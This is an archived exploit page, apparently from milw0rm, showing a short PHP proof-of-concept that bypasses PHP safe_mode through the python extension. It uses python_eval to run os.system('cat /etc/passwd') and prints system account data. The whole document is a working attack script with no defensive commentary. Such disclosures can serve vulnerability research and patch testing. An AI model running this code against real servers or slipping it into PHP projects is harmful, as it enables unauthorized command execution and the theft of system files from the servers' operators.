<html><head><title>PHP python extension safe_mode Bypass Local Vulnerability</title></head><pre>&lt;?php
/*
  php_python_bypass.php
  php python extension safe_mode bypass
  Amir Salmani - amir[at]salmani[dot]ir
*/

//python ext. installed?
if (!extension_loaded('python')) die(&quot;python extension is not installed\n&quot;);

//eval python code
$res = python_eval('
import os
pwd = os.getcwd()
print pwd
os.system('cat /etc/passwd')
');

//show result
echo $res;
?&gt;

# milw0rm.com [2008-12-17]</pre></html>